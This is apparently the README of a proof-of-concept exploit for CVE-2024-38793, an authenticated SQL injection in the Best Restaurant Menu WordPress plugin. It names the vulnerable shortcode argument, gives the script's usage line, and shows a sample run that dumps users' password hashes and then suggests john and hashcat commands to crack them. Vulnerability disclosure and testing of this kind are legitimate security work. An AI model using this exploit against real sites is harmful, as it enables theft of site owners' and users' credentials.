# CVE-2024-38793-PoC
Proof of Concept code for exploitation of CVE-2024-38793 (Best Restaurant Menu by PriceListo &lt;= 1.4.1 - Authenticated (Contributor+) SQL Injection).
## Proof Of Concept
This is a proof of concept exploit for the vulnerability [CVE-2024-38793](https://patchstack.com/database/vulnerability/best-restaurant-menu-by-pricelisto/wordpress-best-restaurant-menu-by-pricelisto-plugin-1-4-1-sql-injection-vulnerability), an SQL injection vulnerability for versions of the WordPress plugin [Best Restaurant Menu a.k.a Great Restaurant Menu WP](https://wordpress.org/plugins/best-restaurant-menu-by-pricelisto/) before 1.4.2.

The vulnerability occurs because of a lack on input sanitization on the groups argument when using the brm_restaurant_menu shortcode.

**Note**: This does require the credentials of a user with at least Contributor level privileges.

The code will attempt to grab the username and password hashes from the WordPress users table.

## Usage
```
CVE-2024-38793 Exploit (Best Restaurant Menu by PriceListo Version <= 1.4.1) PoC
         Requires Contributor+ Privileges on a WordPress instance with the plugin installed
         Credit: @ret2desync
         Will attempt to create a new post, exploit the vulnerability and extract all users usernames and password hashes
         Example usage:
         python3 CVE-2024-38793.py -t "http://127.0.0.1/wordpress/" -u contributor -p password --proxy "http://127.0.0.1:8080"
usage: CVE-2024-38793.py [-h] -t TARGET -u USERNAME -p PASSWORD [--proxy PROXY] [-o OUTFILE]

```
## Example run
```
python3 CVE-2024-38793.py -t "http://127.0.0.1/wordpress/" -u contributor -p password      
CVE-2024-38793 Exploit (Best Restaurant Menu by PriceListo Version <= 1.4.1) PoC
         Requires Contributor+ Privileges on a WordPress instance with the plugin installed
         Credit: @ret2desync
         Will attempt to create a new post, exploit the vulnerability and extract all users usernames and password hashes
         Example usage:
         python3 CVE-2024-38793.py -t "http://127.0.0.1/wordpress/" -u contributor -p password --proxy "http://127.0.0.1:8080"
[*] Successfully signed in to Wordpress using contributor password
[*] Successfully created new post, id: 219
[*] Successfully saved new post with exploit, post id: 219
[*] Successfully grabbed usernames and password hashes
[*] Found 2 sets of credentials
[***                Credentials                ***]
root:$P$BG.b.gHI.byee9PWs8GspKxY9qp0Cm0
contributor:$P$BBVRINbQUo28Tpbp3H7/iITT/Eo9aR0
[*] Crack hashes with: 
 john <hashes_file> --wordlist=<wordlist> 
 hashcat -m 400 -a 0 --username <hashes_file> <wordlist>
[*] Exploit completed successfully
```